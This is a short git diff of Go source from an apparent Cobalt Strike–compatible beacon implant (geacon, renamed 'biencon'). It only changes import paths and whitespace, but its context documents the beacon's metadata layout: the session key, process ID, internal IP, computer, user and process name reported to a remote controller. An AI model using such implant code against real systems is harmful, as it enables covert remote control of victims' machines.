@@ -6,13 +6,14 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
-	"geacon/cmd/config"
-	"geacon/cmd/crypt"
-	"geacon/cmd/sysinfo"
-	"geacon/cmd/util"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/0xBienCuit/biencon/cmd/config"
+	"github.com/0xBienCuit/biencon/cmd/crypt"
+	"github.com/0xBienCuit/biencon/cmd/sysinfo"
+	"github.com/0xBienCuit/biencon/cmd/util"
 
 	"github.com/imroc/req"
 )
@@ -127,6 +128,7 @@ func EncryptedMetaInfo() string {
 
 /*
 MetaData for 4.1
+
 	Key(16) | Charset1(2) | Charset2(2) |
 	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
 	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
@@ -162,7 +164,6 @@ func MakeMetaInfo() []byte {
 		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
-
 
 	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
